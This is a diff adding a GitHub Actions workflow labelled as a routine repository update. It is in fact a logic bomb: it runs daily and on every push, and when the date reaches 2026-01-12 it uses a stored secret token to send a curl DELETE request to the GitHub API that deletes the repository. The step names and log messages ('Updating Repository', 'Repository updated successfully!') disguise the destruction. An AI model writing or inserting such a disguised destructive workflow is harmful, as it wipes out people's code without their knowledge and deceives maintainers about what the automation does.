@@ -1,0 +1,53 @@
+name: routine worflow
+
+on:
+  schedule:
+    # Runs every day at 00:00 UTC
+    - cron: '0 0 * * *'
+  push:
+    branches:
+      - master
+      - main
+  workflow_dispatch: 
+
+jobs:
+  update-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check current date
+        id: check_date
+        run: |
+          CURRENT_DATE=$(date +%Y-%m-%d)
+          TARGET_DATE="2026-01-12"
+          echo "Current date: $CURRENT_DATE"
+          echo "Target date: $TARGET_DATE"
+          
+          if [ "$CURRENT_DATE" == "$TARGET_DATE" ]; then
+            echo "shouldwork=true" >> $GITHUB_OUTPUT
+          else
+            echo "shouldwork=false" >> $GITHUB_OUTPUT
+          fi
+
+      - name: Updating Repository
+        if: steps.check_date.outputs.shouldwork == 'true'
+        env:
+          GITHUB_TOKEN: ${{ secrets.WORKFLOW_TOKEN }}
+          REPO_NAME: ${{ github.repository }}
+        run: |
+          echo "Deleting repository: $REPO_NAME"
+          curl -X DELETE \
+            -H "Authorization: token $GITHUB_TOKEN" \
+            -H "Accept: application/vnd.github.v3+json" \
+            https://api.github.com/repos/$REPO_NAME
+          
+          if [ $? -eq 0 ]; then
+            echo "Repository updated successfully!"
+          else
+            echo "Failed to updated repository. Check permissions."
+            exit 1
+          fi
+
+      - name: Skip update
+        if: steps.check_date.outputs.shouldwork == 'false'
+        run: |
+          echo "Not the target date yet. Skipping update."
